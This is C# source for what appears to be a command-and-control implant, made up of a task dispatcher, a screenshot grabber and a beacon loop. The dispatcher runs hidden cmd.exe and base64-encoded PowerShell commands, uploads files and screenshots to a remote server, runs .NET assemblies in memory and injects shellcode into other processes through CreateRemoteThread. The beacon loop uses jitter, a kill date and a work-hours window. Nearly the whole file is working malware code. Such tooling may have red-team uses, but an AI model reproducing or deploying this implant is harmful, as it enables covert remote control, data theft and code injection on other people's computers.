// ─── Screenshot ───────────────────────────────────────────────────────────────

static class Screenshot
{
    [DllImport("user32.dll")]  static extern int  GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")]  static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")]  static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("gdi32.dll")]   static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    [DllImport("gdi32.dll")]   static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
    [DllImport("gdi32.dll")]   static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
    [DllImport("gdi32.dll")]   static extern bool   BitBlt(IntPtr hdcDest, int xDest, int yDest, int w, int h, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);
    [DllImport("gdi32.dll")]   static extern bool   DeleteDC(IntPtr hdc);
    [DllImport("gdi32.dll")]   static extern bool   DeleteObject(IntPtr hObject);
    [DllImport("user32.dll")]  static extern int    ReleaseDC(IntPtr hWnd, IntPtr hDC);

    // Returns PNG bytes
    public static byte[] Capture()
    {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        var desk  = GetDesktopWindow();
        var hdcS  = GetWindowDC(desk);
        var hdcM  = CreateCompatibleDC(hdcS);
        var hBmp  = CreateCompatibleBitmap(hdcS, w, h);
        SelectObject(hdcM, hBmp);
        BitBlt(hdcM, 0, 0, w, h, hdcS, 0, 0, 0xCC0020 /*SRCCOPY*/);

        // Marshal bitmap handle to managed Bitmap, then encode as PNG
        var bmp  = System.Drawing.Image.FromHbitmap(hBmp);
        using (var ms = new MemoryStream())
        {
            bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
            DeleteDC(hdcM); DeleteObject(hBmp); ReleaseDC(desk, hdcS);
            return ms.ToArray();
        }
    }
}

// ─── Command dispatcher ───────────────────────────────────────────────────────

class Commander
{
    readonly HttpTransport _t;

    public Commander(HttpTransport t) { _t = t; }

    static string RunShell(string cmd)
    {
        try
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
            };
            var p = Process.Start(psi);
            var o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
            return o;
        }
        catch (Exception ex) { return "[!] " + ex.Message; }
    }

    static string RunPS(string cmd)
    {
        try
        {
            var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
            var psi     = new ProcessStartInfo("powershell.exe", "-NonInteractive -NoProfile -EncodedCommand " + encoded)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
            };
            var p = Process.Start(psi);
            var o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
            return o;
        }
        catch (Exception ex) { return "[!] " + ex.Message; }
    }

    static string ListDir(string path)
    {
        if (string.IsNullOrEmpty(path)) path = Directory.GetCurrentDirectory();
        var sb = new StringBuilder();
        try
        {
            foreach (var d in Directory.GetDirectories(path))
                sb.AppendLine("d " + d);
            foreach (var f in Directory.GetFiles(path))
            {
                var fi = new FileInfo(f);
                sb.AppendLine(string.Format("{0,12} {1}", fi.Length, f));
            }
        }
        catch (Exception ex) { sb.AppendLine("[!] " + ex.Message); }
        return sb.ToString();
    }

    static string ListProcesses()
    {
        var sb = new StringBuilder();
        sb.AppendLine(string.Format("{0,-8} {1,-30} {2}", "PID", "Name", "Session"));
        foreach (var p in Process.GetProcesses())
            try { sb.AppendLine(string.Format("{0,-8} {1,-30} {2}", p.Id, p.ProcessName, p.SessionId)); }
            catch { }
        return sb.ToString();
    }

    static string PsJson()
    {
        var sb = new StringBuilder("[");
        bool first = true;
        foreach (var p in Process.GetProcesses())
        {
            try
            {
                if (!first) sb.Append(',');
                sb.AppendFormat("{{\"pid\":{0},\"name\":\"{1}\",\"session\":{2}}}", p.Id, p.ProcessName.Replace("\"","\\\""), p.SessionId);
                first = false;
            }
            catch { }
        }
        return sb.Append(']').ToString();
    }

    public void Dispatch(TaskWire task)
    {
        string result = "", err = "";
        try
        {
            switch (task.type)
            {
                case "SHELL":
                    result = RunShell(task.args ?? "");
                    break;

                case "SHELL_OPSEC":
                    // Run via conhost.exe to avoid direct cmd.exe spawn
                    result = RunShell("cmd /c " + (task.args ?? ""));
                    break;

                case "POWERSHELL":
                    result = RunPS(task.args ?? "");
                    break;

                case "SLEEP":
                {
                    var parts = (task.args ?? "").Split(' ');
                    if (parts.Length >= 1 && int.TryParse(parts[0], out var sec)) Config.SleepSec  = sec;
                    if (parts.Length >= 2 && int.TryParse(parts[1], out var jit)) Config.JitterPct = jit;
                    result = string.Format("sleep={0}s jitter={1}%", Config.SleepSec, Config.JitterPct);
                    break;
                }

                case "SYSINFO":
                {
                    var si = SysInfo.Collect();
                    result = string.Format("Hostname: {0}\nUsername: {1}\nOS: {2}\nPID: {3}\nAdmin: {4}",
                        si.Hostname, si.Username, si.OS, si.PID, si.IsAdmin);
                    break;
                }

                case "WHOAMI":
                    result = Environment.UserDomainName + "\\" + Environment.UserName;
                    break;

                case "GETPID":
                    result = Process.GetCurrentProcess().Id.ToString();
                    break;

                case "USERNAME":
                case "USER":
                    result = Environment.UserName;
                    break;

                case "COMPUTERNAME":
                    result = Dns.GetHostName();
                    break;

                case "USERDOMAIN":
                    result = Environment.UserDomainName;
                    break;

                case "HOME":
                case "USERPROFILE":
                    result = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                    break;

                case "TEMP":
                    result = Path.GetTempPath();
                    break;

                case "ENV":
                {
                    var sb = new StringBuilder();
                    foreach (System.Collections.DictionaryEntry e in Environment.GetEnvironmentVariables())
                        sb.AppendLine(e.Key + "=" + e.Value);
                    result = sb.ToString();
                    break;
                }

                case "PWD":
                case "CWD":
                    result = Directory.GetCurrentDirectory();
                    break;

                case "CD":
                    Directory.SetCurrentDirectory(task.args ?? "");
                    result = Directory.GetCurrentDirectory();
                    break;

                case "LS":
                    result = ListDir(task.args);
                    break;

                case "PS":
                case "PS_TABLE":
                    result = ListProcesses();
                    break;

                case "PS_JSON":
                    result = PsJson();
                    break;

                case "MKDIR":
                    Directory.CreateDirectory(task.args ?? "");
                    result = "created";
                    break;

                case "RM":
                {
                    var p = task.args ?? "";
                    if (Directory.Exists(p)) Directory.Delete(p, true);
                    else File.Delete(p);
                    result = "deleted";
                    break;
                }

                case "CP":
                case "MV":
                {
                    var parts = (task.args ?? "").Split(new[]{' '}, 2);
                    if (parts.Length < 2) { err = "usage: src dst"; break; }
                    if (task.type == "CP") File.Copy(parts[0], parts[1], true);
                    else                   File.Move(parts[0], parts[1]);
                    result = "ok";
                    break;
                }

                case "CAT":
                    result = File.ReadAllText(task.args ?? "");
                    break;

                case "DOWNLOAD":
                {
                    var path  = task.args ?? "";
                    var bytes = File.ReadAllBytes(path);
                    _t.UploadFile(task.id, path, bytes);
                    result = string.Format("uploaded {0} bytes", bytes.Length);
                    break;
                }

                case "UPLOAD":
                {
                    var parts = (task.args ?? "").Split(new[]{' '}, 2);
                    if (parts.Length < 2) { err = "usage: remote_path local_name"; break; }
                    var bytes = _t.DownloadFile(parts[1]);
                    File.WriteAllBytes(parts[0], bytes);
                    result = string.Format("written {0} bytes to {1}", bytes.Length, parts[0]);
                    break;
                }

                case "DOTNET_EXEC":
                case "EXECUTE_ASSEMBLY":
                case "EXEC_ASSEMBLY":
                case "CLR_STOMP":
                {
                    // payload = base64 .NET assembly; args = command-line arguments
                    if (string.IsNullOrEmpty(task.payload)) { err = "no payload"; break; }
                    var asmBytes = Convert.FromBase64String(task.payload);
                    var asmArgs  = string.IsNullOrEmpty(task.args)
                        ? new string[0]
                        : task.args.Split(new[]{' '}, StringSplitOptions.RemoveEmptyEntries);
                    result = InlineExec.ExecuteAssembly(asmBytes, asmArgs);
                    break;
                }

                case "INJECT_REMOTE":
                {
                    // args = pid; payload = base64 shellcode
                    if (!int.TryParse((task.args ?? "").Trim(), out var pid)) { err = "bad pid"; break; }
                    if (string.IsNullOrEmpty(task.payload)) { err = "no shellcode"; break; }
                    var sc   = Convert.FromBase64String(task.payload);
                    var proc = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
                    var mem  = Win32.VirtualAllocEx(proc, IntPtr.Zero, sc.Length, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_EXECUTE_READWRITE);
                    Win32.WriteProcessMemory(proc, mem, sc, sc.Length, out _);
                    Win32.CreateRemoteThread(proc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out _);
                    Win32.CloseHandle(proc);
                    result = string.Format("injected {0} bytes into pid {1}", sc.Length, pid);
                    break;
                }

                case "SCREENSHOT":
                {
                    var png = Screenshot.Capture();
                    _t.UploadFile(task.id, "screenshot.png", png);
                    result = string.Format("captured {0} bytes", png.Length);
                    break;
                }

                case "CLEANUP":
                    Environment.Exit(0);
                    break;

                case "KILL":
                    Environment.Exit(0);
                    break;

                case "DRIVES":
                {
                    var sb = new StringBuilder();
                    foreach (var d in DriveInfo.GetDrives())
                        try { sb.AppendLine(string.Format("{0} {1} {2:N0} free", d.Name, d.DriveType, d.AvailableFreeSpace)); }
                        catch { sb.AppendLine(d.Name); }
                    result = sb.ToString();
                    break;
                }

                case "NETSTAT":
                    result = RunShell("netstat -ano");
                    break;

                case "IPCONFIG":
                    result = RunShell("ipconfig /all");
                    break;

                case "DISPLAY":
                {
                    result = string.Format("{0}x{1}", Win32Helper.ScreenWidth(), Win32Helper.ScreenHeight());
                    break;
                }

                case "GREP":
                {
                    var parts = (task.args ?? "").Split(new[]{' '}, 2);
                    if (parts.Length < 2) { err = "usage: pattern path"; break; }
                    result = GrepFile(parts[0], parts[1]);
                    break;
                }

                case "DETECTED":
                    result = "acknowledged";
                    break;

                default:
                    err = "unsupported task type: " + task.type;
                    break;
            }
        }
        catch (Exception ex)
        {
            err = ex.Message;
        }
        _t.SendResult(task.id, result, err);
    }

    static string GrepFile(string pattern, string path)
    {
        try
        {
            var rx = new Regex(pattern);
            var sb = new StringBuilder();
            int n  = 0;
            foreach (var line in File.ReadLines(path))
            {
                n++;
                if (rx.IsMatch(line)) sb.AppendLine(n + ":" + line);
                if (sb.Length > 1024 * 1024) break;
            }
            return sb.ToString();
        }
        catch (Exception ex) { return "[!] " + ex.Message; }
    }
}

static class Win32Helper
{
    [DllImport("user32.dll")] static extern int GetSystemMetrics(int i);
    public static int ScreenWidth()  => GetSystemMetrics(0);
    public static int ScreenHeight() => GetSystemMetrics(1);
}

// ─── Entry point ─────────────────────────────────────────────────────────────

class Program
{
    [STAThread]
    static void Main(string[] args)
    {
        KillDateGuard.CheckExit();
        Guardrails.CheckExit();

        var transport  = new HttpTransport(Config.ServerURL);
        var commander  = new Commander(transport);
        var sysInfo    = SysInfo.Collect();
        int failCount  = 0;
        int maxRetry   = 0;
        int.TryParse(Config.MaxRetry, out maxRetry);

    outer:
        while (true)
        {
            // Registration loop
            while (!transport.Register(sysInfo))
            {
                failCount++;
                Thread.Sleep(Math.Min(30000, 2000 * failCount));
            }
            failCount = 0;

            // Beacon loop
            while (true)
            {
                KillDateGuard.CheckExit();

                if (!WorkHours.InWindow())
                {
                    WorkHours.SleepUntilWindow();
                    continue;
                }

                try
                {
                    var tasks = transport.Beacon();
                    if (tasks != null)
                    {
                        failCount = 0;
                        foreach (var task in tasks)
                            ThreadPool.QueueUserWorkItem(_ => commander.Dispatch(task));
                    }
                }
                catch (AgentUnknownException)
                {
                    goto outer; // re-register
                }
                catch
                {
                    failCount++;
                    if (maxRetry > 0 && failCount >= maxRetry) Environment.Exit(0);
                }

                Sleeper.Sleep();
            }
        }
    }
}
